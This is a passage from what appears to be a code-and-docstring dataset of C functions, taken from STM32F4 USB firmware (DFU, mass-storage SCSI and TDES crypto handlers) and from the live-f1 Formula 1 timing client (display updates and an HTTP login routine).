&& (status != ERROR)); i+=8)\n  {\n    /* Write the Input block in the Input FIFO */\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n\n    /* Wait until the complete message has been processed */\n    counter = 0;\n    do\n    {\n      busystatus = CRYP_GetFlagStatus(CRYP_FLAG_BUSY);\n      counter++;\n    }while ((counter != TDESBUSY_TIMEOUT) && (busystatus != RESET));\n\n    if (busystatus != RESET)\n   {\n       status = ERROR;\n    }\n    else\n    {\n\n      /* Read the Output block from the Output FIFO */\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n    }\n  }\n\n  /* Disable Crypto */\n  CRYP_Cmd(DISABLE);\n\n  return status; \n}", "path": "lib\\StdPeriph\\src\\stm32f4xx_cryp_tdes.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n  * @brief  DFU_Req_UPLOAD\n  *         Handles the DFU UPLOAD request.\n  * @param  pdev: instance\n  * @param  req: pointer to the request structure\n  * @retval status\n  */\n", "func_signal": "static void DFU_Req_UPLOAD(void *pdev, USB_SETUP_REQ *req)", "code": "{\n  uint8_t *Phy_Addr = NULL;\n  uint32_t Addr = 0;\n  \n  /* Data setup request */\n  if (req->wLength > 0)\n  {\n    if ((DeviceState == STATE_dfuIDLE) || (DeviceState == STATE_dfuUPLOAD_IDLE))\n    {\n      /* Update the global langth and block number */\n      wBlockNum = req->wValue;\n      wlength = req->wLength;\n      \n      /* DFU Get Command */\n      if (wBlockNum == 0)  \n      {\n        /* Update the state machine */\n        DeviceState = (wlength > 3)? STATE_dfuIDLE:STATE_dfuUPLOAD_IDLE;        \n        DeviceStatus[4] = DeviceState;\n        DeviceStatus[1] = 0;\n        DeviceStatus[2] = 0;\n        DeviceStatus[3] = 0;\n        \n        /* Store the values of all supported commands */\n        MAL_Buffer[0] = CMD_GETCOMMANDS;\n        MAL_Buffer[1] = CMD_SETADDRESSPOINTER;\n        MAL_Buffer[2] = CMD_ERASE;\n        \n        /* Send the status data over EP0 */\n        USBD_CtlSendData (pdev,\n                          (uint8_t *)(&(MAL_Buffer[0])),\n                          3);\n      }\n      else if (wBlockNum > 1)\n      {\n        DeviceState = STATE_dfuUPLOAD_IDLE ;\n        DeviceStatus[4] = DeviceState;\n        DeviceStatus[1] = 0;\n        DeviceStatus[2] = 0;\n        DeviceStatus[3] = 0;\n        Addr = ((wBlockNum - 2) * XFERSIZE) + Pointer;  /* Change is Accelerated*/\n        \n        /* Return the physical address where data are stored */\n        Phy_Addr = MAL_Read(Addr, wlength);\n        \n        /* Send the status data over EP0 */\n        USBD_CtlSendData (pdev,\n                          Phy_Addr,\n                          wlength);\n      }\n      else  /* unsupported wBlockNum */\n      {\n        DeviceState = STATUS_ERRSTALLEDPKT;\n        DeviceStatus[4] = DeviceState;\n        DeviceStatus[1] = 0;\n        DeviceStatus[2] = 0;\n        DeviceStatus[3] = 0;\n        \n        /* Call the error management function (command will be nacked */\n        USBD_CtlError (pdev, req); \n      }\n    }\n    /* Unsupported state */\n    else\n    {\n      wlength = 0;\n      wBlockNum = 0;   \n      /* Call the error management function (command will be nacked */\n      USBD_CtlError (pdev, req);\n    }\n  }\n  /* No Data setup request */\n  else\n  {\n    DeviceState = STATE_dfuIDLE;\n    DeviceStatus[1] = 0;\n    DeviceStatus[2] = 0;\n    DeviceStatus[3] = 0;\n    DeviceStatus[4] = DeviceState;\n  }\n}", "path": "lib\\USB_Device\\Class\\dfu\\src\\usbd_dfu_core.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n  * @brief  USBD_DFU_GetOtherCfgDesc \n  *         Returns other speed configuration descriptor.\n  * @param  speed : current device speed\n  * @param  length : pointer data length\n  * @retval pointer to descriptor buffer\n  */\n", "func_signal": "static uint8_t  *USBD_DFU_GetOtherCfgDesc (uint8_t speed, uint16_t *length)", "code": "{\n  *length = sizeof (usbd_dfu_OtherCfgDesc);\n  return usbd_dfu_OtherCfgDesc;\n}", "path": "lib\\USB_Device\\Class\\dfu\\src\\usbd_dfu_core.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n* @brief  SCSI_ModeSense10\n*         Process Mode Sense10 command\n* @param  lun: Logical unit number\n* @param  params: Command parameters\n* @retval status\n*/\n", "func_signal": "static int8_t SCSI_ModeSense10 (uint8_t lun, uint8_t *params)", "code": "{\n uint16_t len = 8;\n\n MSC_BOT_DataLen = len;\n\n while (len) \n  {\n    len--;\n    MSC_BOT_Data[len] = MSC_Mode_Sense10_data[len];\n  }\n  return 0;\n}", "path": "lib\\USB_Device\\Class\\msc\\src\\usbd_msc_scsi.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n  * @brief  DFU_Req_CLRSTATUS \n  *         Handles the DFU CLRSTATUS request.\n  * @param  pdev: device instance\n  * @retval status\n  */\n", "func_signal": "static void DFU_Req_CLRSTATUS(void *pdev)", "code": "{\n  if (DeviceState == STATE_dfuERROR)\n  {\n    DeviceState = STATE_dfuIDLE;\n    DeviceStatus[0] = STATUS_OK;/*bStatus*/\n    DeviceStatus[1] = 0;\n    DeviceStatus[2] = 0;\n    DeviceStatus[3] = 0; /*bwPollTimeout=0ms*/\n    DeviceStatus[4] = DeviceState;/*bState*/\n    DeviceStatus[5] = 0;/*iString*/\n  }\n  else\n  {   /*State Error*/\n    DeviceState = STATE_dfuERROR;\n    DeviceStatus[0] = STATUS_ERRUNKNOWN;/*bStatus*/\n    DeviceStatus[1] = 0;\n    DeviceStatus[2] = 0;\n    DeviceStatus[3] = 0; /*bwPollTimeout=0ms*/\n    DeviceStatus[4] = DeviceState;/*bState*/\n    DeviceStatus[5] = 0;/*iString*/\n  }\n}", "path": "lib\\USB_Device\\Class\\dfu\\src\\usbd_dfu_core.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n* @brief  SCSI_Write10\n*         Process Write10 command\n* @param  lun: Logical unit number\n* @param  params: Command parameters\n* @retval status\n*/\n", "func_signal": "static int8_t SCSI_Write10 (uint8_t lun , uint8_t *params)", "code": "{\n  if (MSC_BOT_State == BOT_IDLE) /* Idle */\n  {\n    \n    /* case 8 : Hi <> Do */\n    \n    if ((MSC_BOT_cbw.bmFlags & 0x80) == 0x80)\n    {\n      SCSI_SenseCode(MSC_BOT_cbw.bLUN, \n                     ILLEGAL_REQUEST, \n                     INVALID_CDB);\n      return -1;\n    }\n    \n    /* Check whether Media is ready */\n    if(USBD_STORAGE_fops->IsReady(lun) !=0 )\n    {\n      SCSI_SenseCode(lun,\n                     NOT_READY, \n                     MEDIUM_NOT_PRESENT);\n      return -1;\n    } \n    \n    /* Check If media is write-protected */\n    if(USBD_STORAGE_fops->IsWriteProtected(lun) !=0 )\n    {\n      SCSI_SenseCode(lun,\n                     NOT_READY, \n                     WRITE_PROTECTED);\n      return -1;\n    } \n    \n    \n    SCSI_blk_addr = (params[2] << 24) | \\\n      (params[3] << 16) | \\\n        (params[4] <<  8) | \\\n          params[5];\n    SCSI_blk_len = (params[7] <<  8) | \\\n      params[8];  \n    \n    /* check if LBA address is in the right range */\n    if(SCSI_CheckAddressRange(lun, SCSI_blk_addr, SCSI_blk_len) < 0)\n    {\n      return -1; /* error */      \n    }\n    \n    SCSI_blk_addr *= SCSI_blk_size;\n    SCSI_blk_len  *= SCSI_blk_size;\n    \n    /* cases 3,11,13 : Hn,Ho <> D0 */\n    if (MSC_BOT_cbw.dDataLength != SCSI_blk_len)\n    {\n      SCSI_SenseCode(MSC_BOT_cbw.bLUN, \n                     ILLEGAL_REQUEST, \n                     INVALID_CDB);\n      return -1;\n    }\n    \n    /* Prepare EP to receive first data packet */\n    MSC_BOT_State = BOT_DATA_OUT;  \n    DCD_EP_PrepareRx (cdev,\n                      MSC_OUT_EP,\n                      MSC_BOT_Data, \n                      MIN (SCSI_blk_len, MSC_MEDIA_PACKET));  \n  }\n  else /* Write Process ongoing */\n  {\n    return SCSI_ProcessWrite(lun);\n  }\n  return 0;\n}", "path": "lib\\USB_Device\\Class\\msc\\src\\usbd_msc_scsi.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n* @brief  SCSI_SenseCode\n*         Load the last error code in the error list\n* @param  lun: Logical unit number\n* @param  sKey: Sense Key\n* @param  ASC: Additional Sense Key\n* @retval none\n\n*/\n", "func_signal": "void SCSI_SenseCode(uint8_t lun, uint8_t sKey, uint8_t ASC)", "code": "{\n  SCSI_Sense[SCSI_Sense_Tail].Skey  = sKey;\n  SCSI_Sense[SCSI_Sense_Tail].w.ASC = ASC << 8;\n  SCSI_Sense_Tail++;\n  if (SCSI_Sense_Tail == SENSE_LIST_DEEPTH)\n  {\n    SCSI_Sense_Tail = 0;\n  }\n}", "path": "lib\\USB_Device\\Class\\msc\\src\\usbd_msc_scsi.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n  * @brief  DFU_Req_GETSTATUS\n  *         Handles the DFU GETSTATUS request.\n  * @param  pdev: instance\n  * @retval status\n  */\n", "func_signal": "static void DFU_Req_GETSTATUS(void *pdev)", "code": "{\n  switch (DeviceState)\n  {\n  case   STATE_dfuDNLOAD_SYNC:\n    if (wlength != 0)\n    {\n      DeviceState = STATE_dfuDNBUSY;\n      DeviceStatus[4] = DeviceState;\n      if ((wBlockNum == 0) && (MAL_Buffer[0] == CMD_ERASE))\n      {\n        MAL_GetStatus(Pointer, 0, DeviceStatus);\n      }\n      else\n      {\n        MAL_GetStatus(Pointer, 1, DeviceStatus);\n      }\n    }\n    else  /* (wlength==0)*/\n    {\n      DeviceState = STATE_dfuDNLOAD_IDLE;\n      DeviceStatus[4] = DeviceState;\n      DeviceStatus[1] = 0;\n      DeviceStatus[2] = 0;\n      DeviceStatus[3] = 0;\n    }\n    break;\n    \n  case   STATE_dfuMANIFEST_SYNC :\n    if (Manifest_State == Manifest_In_Progress)\n    {\n      DeviceState = STATE_dfuMANIFEST;\n      DeviceStatus[4] = DeviceState;\n      DeviceStatus[1] = 1;             /*bwPollTimeout = 1ms*/\n      DeviceStatus[2] = 0;\n      DeviceStatus[3] = 0;\n      //break;\n    }\n    else if ((Manifest_State == Manifest_complete) && \\\n      ((usbd_dfu_CfgDesc[(11 + (9 * USBD_ITF_MAX_NUM))]) & 0x04))\n    {\n      DeviceState = STATE_dfuIDLE;\n      DeviceStatus[4] = DeviceState;\n      DeviceStatus[1] = 0;\n      DeviceStatus[2] = 0;\n      DeviceStatus[3] = 0;\n      //break;\n    }\n    break;\n    \n  default :\n    break;\n  }\n  \n  /* Send the status data over EP0 */\n  USBD_CtlSendData (pdev,\n                    (uint8_t *)(&(DeviceStatus[0])),\n                    6);\n}", "path": "lib\\USB_Device\\Class\\dfu\\src\\usbd_dfu_core.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/******************************************************************************\n     DFU Class requests management\n******************************************************************************/\n/**\n  * @brief  DFU_Req_DETACH\n  *         Handles the DFU DETACH request.\n  * @param  pdev: device instance\n  * @param  req: pointer to the request structure.\n  * @retval None.\n  */\n", "func_signal": "static void DFU_Req_DETACH(void *pdev, USB_SETUP_REQ *req)", "code": "{\n  if (DeviceState == STATE_dfuIDLE || DeviceState == STATE_dfuDNLOAD_SYNC\n      || DeviceState == STATE_dfuDNLOAD_IDLE || DeviceState == STATE_dfuMANIFEST_SYNC\n        || DeviceState == STATE_dfuUPLOAD_IDLE )\n  {\n    /* Update the state machine */\n    DeviceState = STATE_dfuIDLE;\n    DeviceStatus[0] = STATUS_OK;\n    DeviceStatus[1] = 0;\n    DeviceStatus[2] = 0;\n    DeviceStatus[3] = 0; /*bwPollTimeout=0ms*/\n    DeviceStatus[4] = DeviceState;\n    DeviceStatus[5] = 0; /*iString*/\n    wBlockNum = 0;\n    wlength = 0;\n  } \n  \n  /* Check the detach capability in the DFU functional descriptor */\n  if ((usbd_dfu_CfgDesc[12 + (9 * USBD_ITF_MAX_NUM)]) & DFU_DETACH_MASK)\n  {\n    /* Perform an Attach-Detach operation on USB bus */\n    DCD_DevDisconnect (pdev);\n    DCD_DevConnect (pdev);  \n  }\n  else\n  {\n    /* Wait for the period of time specified in Detach request */\n    USB_OTG_BSP_mDelay (req->wValue);  \n  }\n}", "path": "lib\\USB_Device\\Class\\dfu\\src\\usbd_dfu_core.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n* @brief  SCSI_Verify10\n*         Process Verify10 command\n* @param  lun: Logical unit number\n* @param  params: Command parameters\n* @retval status\n*/\n", "func_signal": "static int8_t SCSI_Verify10(uint8_t lun , uint8_t *params)", "code": "{\n  if ((params[1]& 0x02) == 0x02) \n  {\n    SCSI_SenseCode (lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);\n    return -1; /* Error, Verify Mode Not supported*/\n  }\n  \n  if(SCSI_CheckAddressRange(lun, SCSI_blk_addr, SCSI_blk_len) < 0)\n  {\n    return -1; /* error */      \n  }\n  MSC_BOT_DataLen = 0;\n  return 0;\n}", "path": "lib\\USB_Device\\Class\\msc\\src\\usbd_msc_scsi.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n* @brief  SCSI_Inquiry\n*         Process Inquiry command\n* @param  lun: Logical unit number\n* @param  params: Command parameters\n* @retval status\n*/\n", "func_signal": "static int8_t  SCSI_Inquiry(uint8_t lun, uint8_t *params)", "code": "{\n  uint8_t* pPage;\n  uint16_t len;\n  \n  if (params[1] & 0x01)/*Evpd is set*/\n  {\n    pPage = (uint8_t *)MSC_Page00_Inquiry_Data;\n    len = LENGTH_INQUIRY_PAGE00;\n  }\n  else\n  {\n    \n    pPage = (uint8_t *)&USBD_STORAGE_fops->pInquiry[lun * USBD_STD_INQUIRY_LENGTH];\n    len = pPage[4] + 5;\n    \n    if (params[4] <= len)\n    {\n      len = params[4];\n    }\n  }\n  MSC_BOT_DataLen = len;\n  \n  while (len) \n  {\n    len--;\n    MSC_BOT_Data[len] = pPage[len];\n  }\n  return 0;\n}", "path": "lib\\USB_Device\\Class\\msc\\src\\usbd_msc_scsi.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n* @brief  SCSI_StartStopUnit\n*         Process Start Stop Unit command\n* @param  lun: Logical unit number\n* @param  params: Command parameters\n* @retval status\n*/\n", "func_signal": "static int8_t SCSI_StartStopUnit(uint8_t lun, uint8_t *params)", "code": "{\n  MSC_BOT_DataLen = 0;\n  return 0;\n}", "path": "lib\\USB_Device\\Class\\msc\\src\\usbd_msc_scsi.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n  * @brief  DFU_Req_DNLOAD\n  *         Handles the DFU DNLOAD request.\n  * @param  pdev: device instance\n  * @param  req: pointer to the request structure\n  * @retval None\n  */\n", "func_signal": "static void DFU_Req_DNLOAD(void *pdev, USB_SETUP_REQ *req)", "code": "{\n  /* Data setup request */\n  if (req->wLength > 0)\n  {\n    if ((DeviceState == STATE_dfuIDLE) || (DeviceState == STATE_dfuDNLOAD_IDLE))\n    {\n      /* Update the global length and block number */\n      wBlockNum = req->wValue;\n      wlength = req->wLength;\n      \n      /* Update the state machine */\n      DeviceState = STATE_dfuDNLOAD_SYNC;\n      DeviceStatus[4] = DeviceState;\n      \n      /* Prepare the reception of the buffer over EP0 */\n      USBD_CtlPrepareRx (pdev,\n                         (uint8_t*)MAL_Buffer,                                  \n                         wlength);\n    }\n    /* Unsupported state */\n    else\n    {\n      /* Call the error management function (command will be nacked */\n      USBD_CtlError (pdev, req);\n    }\n  }\n  /* 0 Data DNLOAD request */\n  else\n  {\n    /* End of DNLOAD operation*/\n    if (DeviceState == STATE_dfuDNLOAD_IDLE || DeviceState == STATE_dfuIDLE )\n    {\n      Manifest_State = Manifest_In_Progress;\n      DeviceState = STATE_dfuMANIFEST_SYNC;\n      DeviceStatus[1] = 0;\n      DeviceStatus[2] = 0;\n      DeviceStatus[3] = 0;\n      DeviceStatus[4] = DeviceState;\n    }\n    else\n    {\n      /* Call the error management function (command will be nacked */\n      USBD_CtlError (pdev, req);\n    }\n  }  \n}", "path": "lib\\USB_Device\\Class\\dfu\\src\\usbd_dfu_core.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n  * @brief  DFU_Req_ABORT\n  *         Handles the DFU ABORT request.\n  * @param  pdev: device instance\n  * @retval None\n  */\n", "func_signal": "static void DFU_Req_ABORT(void *pdev)", "code": "{\n  if (DeviceState == STATE_dfuIDLE || DeviceState == STATE_dfuDNLOAD_SYNC\n      || DeviceState == STATE_dfuDNLOAD_IDLE || DeviceState == STATE_dfuMANIFEST_SYNC\n        || DeviceState == STATE_dfuUPLOAD_IDLE )\n  {\n    DeviceState = STATE_dfuIDLE;\n    DeviceStatus[0] = STATUS_OK;\n    DeviceStatus[1] = 0;\n    DeviceStatus[2] = 0;\n    DeviceStatus[3] = 0; /*bwPollTimeout=0ms*/\n    DeviceStatus[4] = DeviceState;\n    DeviceStatus[5] = 0; /*iString*/\n    wBlockNum = 0;\n    wlength = 0;\n  }  \n}", "path": "lib\\USB_Device\\Class\\dfu\\src\\usbd_dfu_core.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n  * @brief  usbd_dfu_Setup\n  *         Handles the DFU request parsing.\n  * @param  pdev: instance\n  * @param  req: usb requests\n  * @retval status\n  */\n", "func_signal": "static uint8_t  usbd_dfu_Setup (void  *pdev, \n                                USB_SETUP_REQ *req)", "code": "{\n  uint16_t len = 0;\n  uint8_t  *pbuf = NULL;\n  \n  switch (req->bmRequest & USB_REQ_TYPE_MASK)\n  {\n    /* DFU Class Requests -------------------------------*/\n  case USB_REQ_TYPE_CLASS :  \n    switch (req->bRequest)\n    {\n    case DFU_DNLOAD:\n      DFU_Req_DNLOAD(pdev, req);\n      break;\n      \n    case DFU_UPLOAD:\n      DFU_Req_UPLOAD(pdev, req);   \n      break;\n      \n    case DFU_GETSTATUS:\n      DFU_Req_GETSTATUS(pdev);\n      break;\n      \n    case DFU_CLRSTATUS:\n      DFU_Req_CLRSTATUS(pdev);\n      break;      \n\n    case DFU_GETSTATE:\n      DFU_Req_GETSTATE(pdev);\n      break;  \n\n    case DFU_ABORT:\n      DFU_Req_ABORT(pdev);\n      break;\n\n    case DFU_DETACH:\n      DFU_Req_DETACH(pdev, req);\n      break;\n\n    default:\n      USBD_CtlError (pdev, req);\n      return USBD_FAIL;\n    }\n    break;\n    \n    /* Standard Requests -------------------------------*/\n  case USB_REQ_TYPE_STANDARD:\n    switch (req->bRequest)\n    {\n    case USB_REQ_GET_DESCRIPTOR: \n      if( (req->wValue >> 8) == DFU_DESCRIPTOR_TYPE)\n      {\n#ifdef USB_OTG_HS_INTERNAL_DMA_ENABLED\n        pbuf = usbd_dfu_Desc;   \n#else\n        pbuf = usbd_dfu_CfgDesc + 9 + (9 * USBD_ITF_MAX_NUM);\n#endif \n        len = MIN(USB_DFU_DESC_SIZ , req->wLength);\n      }\n      \n      USBD_CtlSendData (pdev, \n                        pbuf,\n                        len);\n      break;\n      \n    case USB_REQ_GET_INTERFACE :\n      USBD_CtlSendData (pdev,\n                        (uint8_t *)&usbd_dfu_AltSet,\n                        1);\n      break;\n      \n    case USB_REQ_SET_INTERFACE :\n      if ((uint8_t)(req->wValue) < USBD_ITF_MAX_NUM)\n      {\n        usbd_dfu_AltSet = (uint8_t)(req->wValue);\n      }\n      else\n      {\n        /* Call the error management function (command will be nacked */\n        USBD_CtlError (pdev, req);\n      }\n      break;\n    }\n  }\n  return USBD_OK;\n}", "path": "lib\\USB_Device\\Class\\dfu\\src\\usbd_dfu_core.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n* @brief  SCSI_Read10\n*         Process Read10 command\n* @param  lun: Logical unit number\n* @param  params: Command parameters\n* @retval status\n*/\n", "func_signal": "static int8_t SCSI_Read10(uint8_t lun , uint8_t *params)", "code": "{\n  if(MSC_BOT_State == BOT_IDLE)  /* Idle */\n  {\n    \n    /* case 10 : Ho <> Di */\n    \n    if ((MSC_BOT_cbw.bmFlags & 0x80) != 0x80)\n    {\n      SCSI_SenseCode(MSC_BOT_cbw.bLUN, \n                     ILLEGAL_REQUEST, \n                     INVALID_CDB);\n      return -1;\n    }    \n    \n    if(USBD_STORAGE_fops->IsReady(lun) !=0 )\n    {\n      SCSI_SenseCode(lun,\n                     NOT_READY, \n                     MEDIUM_NOT_PRESENT);\n      return -1;\n    } \n    \n    SCSI_blk_addr = (params[2] << 24) | \\\n      (params[3] << 16) | \\\n        (params[4] <<  8) | \\\n          params[5];\n    \n    SCSI_blk_len =  (params[7] <<  8) | \\\n      params[8];  \n    \n    \n    \n    if( SCSI_CheckAddressRange(lun, SCSI_blk_addr, SCSI_blk_len) < 0)\n    {\n      return -1; /* error */\n    }\n    \n    MSC_BOT_State = BOT_DATA_IN;\n    SCSI_blk_addr *= SCSI_blk_size;\n    SCSI_blk_len  *= SCSI_blk_size;\n    \n    /* cases 4,5 : Hi <> Dn */\n    if (MSC_BOT_cbw.dDataLength != SCSI_blk_len)\n    {\n      SCSI_SenseCode(MSC_BOT_cbw.bLUN, \n                     ILLEGAL_REQUEST, \n                     INVALID_CDB);\n      return -1;\n    }\n  }\n  MSC_BOT_DataLen = MSC_MEDIA_PACKET;  \n  \n  return SCSI_ProcessRead(lun);\n}", "path": "lib\\USB_Device\\Class\\msc\\src\\usbd_msc_scsi.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n * handle_keys:\n * @state: application state structure.\n *\n * Checks for a key press on the keyboard and handles it; this includes\n * keys that should quit the app (Enter, Escape, q, etc.) and pseudo-keys\n * like the resize event.\n *\n * Returns: 0 if none were pressed, 1 if one was, -1 if should quit.\n **/\n", "func_signal": "int\nhandle_keys (CurrentState *state)", "code": "{\n\tif (! cursed)\n\t\treturn 0;\n\n\tswitch (getch ()) {\n\tcase KEY_ENTER:\n\tcase '\\r':\n\tcase '\\n':\n\tcase 0x1b: /* Escape */\n\tcase 'q':\n\tcase 'Q':\n\t\treturn -1;\n\tcase KEY_RESIZE:\n\t\tclear_board (state);\n\t\treturn 1;\n\tdefault:\n\t\treturn 0;\n\t}\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * obtain_auth_cookie:\n * @host: host to obtain cookie from,\n * @email: e-mail address registered with the F1 website,\n * @password: paassword registered for @email.\n *\n * Obtains the user's authentication cookie from the Live Timing website\n * by logging in with their e-mail address and password and stealing out\n * of the response headers.\n *\n * For convenience sake, the cookie is never unencoded.\n *\n * Returns: cookie in newly allocated string or NULL on failure.\n **/\n", "func_signal": "char *\nobtain_auth_cookie (const char *host,\n\t\t    const char *email,\n\t\t    const char *password)", "code": "{\n\tne_session *sess;\n\tne_request *req;\n\tchar       *cookie = NULL, *body, *e_email, *e_password;\n\tconst char *header;\n\n\tinfo (1, _(\"Obtaining authentication cookie ...\\n\"));\n\n\t/* Encode the e-mail and password as a form */\n\te_email = ne_path_escape (email);\n\te_password = ne_path_escape (password);\n\tbody = malloc (strlen (e_email) + strlen (e_password) + 17);\n\tsprintf (body, \"email=%s&password=%s\", e_email, e_password);\n\tfree (e_password);\n\tfree (e_email);\n\n\tsess = ne_session_create (\"http\", host, 80);\n\tne_set_useragent (sess, PACKAGE_STRING);\n\n\t/* Create the request */\n\treq = ne_request_create (sess, \"POST\", LOGIN_URL);\n\tne_add_request_header (req, \"Content-Type\",\n\t\t\t       \"application/x-www-form-urlencoded\");\n\tne_set_request_body_buffer (req, body, strlen (body));\n\n#if ! HAVE_NE_GET_RESPONSE_HEADER\n\t/* Set the handler for the cookie header */\n\tne_add_response_header_handler (req, \"Set-Cookie\",\n\t\t\t\t\t(ne_header_handler) parse_cookie_hdr,\n\t\t\t\t\t&cookie);\n\theader = NULL;\n#endif\n\n\t/* Dispatch the event, and check it was a good one */\n\tif (ne_request_dispatch (req)) {\n\t\tfprintf (stderr, \"%s: %s: %s\\n\", program_name,\n\t\t\t _(\"login request failed\"), ne_get_error (sess));\n\t\tgoto error;\n\t} else if (ne_get_status (req)->code >= 400) {\n\t\tfprintf (stderr, \"%s: %s: %s\\n\", program_name,\n\t\t\t _(\"login request failed\"),\n\t\t\t ne_get_status (req)->reason_phrase);\n\t\tgoto error;\n\t}\n\n#if HAVE_NE_GET_RESPONSE_HEADER\n\theader = ne_get_response_header (req, \"Set-Cookie\");\n\tif (header)\n\t\tparse_cookie_hdr (&cookie, header);\n#endif\n\n\tif (! cookie) {\n\t\tfprintf (stderr, \"%s: %s\\n\", program_name,\n\t\t\t _(\"login failed: check email and password in ~/.f1rc\"));\n\t\tgoto fatal_error;\n\t}\n\nerror:\n\tne_request_destroy (req);\n\tne_session_destroy (sess);\n\n\treturn cookie;\n\nfatal_error:\n\tne_request_destroy (req);\n\tne_session_destroy (sess);\n\n\texit (2);\n}", "path": "src\\http.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * numlen:\n * @number: number to calculate length of.\n *\n * Returns: the number of digits in number.\n **/\n", "func_signal": "static inline size_t\nnumlen (unsigned int number)", "code": "{\n\tsize_t len = 1;\n\n\twhile (number /= 10)\n\t\tlen++;\n\n\treturn len;\n}", "path": "src\\http.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * _update_time:\n * @state: application state structure.\n *\n * Updates the time in the status window without redrawing the display.\n **/\n", "func_signal": "static void\n_update_time (CurrentState *state)", "code": "{\n\ttime_t remaining;\n\n\tif (! statwin)\n\t\treturn;\n\n\twmove (statwin, nlines - 1, 2);\n\twattrset (statwin, attrs[COLOUR_DATA]);\n\n\t// Pause the clock during a red flag, but only for Qualifying and the Race.\n\tif ((state->flag == RED_FLAG) && (state->event_type != PRACTICE_EVENT))\n\t{\n\t\tremaining = state->remaining_time;\n\t} else if (state->epoch_time) {\n\t\tremaining = MAX ((state->epoch_time + state->remaining_time) - time (NULL), 0);\n\t} else {\n\t\tremaining = state->remaining_time;\n\t}\n\n\tif (remaining >= 3600) {\n\t\twprintw (statwin, \"%d:\", remaining / 3600);\n\t\tremaining %= 3600;\n\t\twprintw (statwin, \"%02d:\", remaining / 60);\n\t\tremaining %= 60;\n\t\twprintw (statwin, \"%02d\", remaining);\n\t} else if (remaining >= 60) {\n\t\twprintw (statwin, \"0:%02d:\", remaining / 60);\n\t\tremaining %= 60;\n\t\twprintw (statwin, \"%02d\", remaining);\n\t} else {\n\t\twprintw (statwin, \"0:00:%02d\", remaining);\n\t}\n\n\twnoutrefresh (statwin);\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * update_status:\n * @state: application state structure,\n *\n * Update the status window, creating it if necessary.  Updates the\n * display when done.\n **/\n", "func_signal": "void\nupdate_status (CurrentState *state)", "code": "{\n\tif (! cursed)\n\t\tclear_board (state);\n\tclose_popup ();\n\n\t/* Put the window down the side if we have enough room */\n\tif (! statwin) {\n\t\tif (COLS < 80)\n\t\t\treturn;\n\n\t\tstatwin = newwin (nlines, 10, 0, COLS - 10);\n\t\twbkgdset (statwin, attrs[COLOUR_DATA]);\n\t\twerase (statwin);\n\t}\n\n\t/* Session status */\n\n\twmove (statwin, 2, 0);\n\twclrtoeol (statwin);\n\tswitch (state->flag) {\n\tcase YELLOW_FLAG:\n\tcase SAFETY_CAR_STANDBY:\n\tcase SAFETY_CAR_DEPLOYED:\n\t\twattrset (statwin, attrs[COLOUR_YELLOW_FLAG]);\n\t\tdraw_bar (statwin, 10);\n\t\tbreak;\n\tcase RED_FLAG:\n\t\twattrset (statwin, attrs[COLOUR_RED_FLAG]);\n\t\tdraw_bar (statwin, 10);\n\t\tbreak;\n\t}\n\twmove (statwin, 3, 0);\n\twclrtoeol (statwin);\n\tswitch (state->flag) {\n\tcase SAFETY_CAR_DEPLOYED:\n\t\twattrset (statwin, attrs[COLOUR_OLD]);\n\t\twaddstr (statwin, \"SAFETY CAR\");\n\t\tbreak;\n\t}\n\n\t/* Number of laps, or event type */\n\n\twattrset (statwin, attrs[COLOUR_DATA]);\n\twmove (statwin, 0, 0);\n\twclrtoeol (statwin);\n\tswitch (state->event_type) {\n\tcase RACE_EVENT:\n\t\tswitch (state->total_laps - state->laps_completed) {\n\t\tcase 0:\n\t\t\twprintw (statwin, \"%10s\", \"FINISHED\");\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\twprintw (statwin, \"%10s\", 